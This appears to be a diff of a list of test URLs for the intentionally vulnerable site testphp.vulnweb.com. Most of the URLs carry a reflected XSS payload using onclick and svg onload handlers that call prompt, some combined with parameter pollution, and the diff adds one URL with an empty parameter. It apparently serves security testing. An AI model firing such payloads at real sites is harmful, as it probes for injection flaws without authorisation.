@@ -1,5 +1,6 @@
 http://testphp.vulnweb.com:80/hpp/?pp="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
 http://testphp.vulnweb.com:80/hpp/index.php?pp="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
 http://testphp.vulnweb.com/hpp/?pp="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/hpp/params.php?p=
 http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
 http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&pp="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
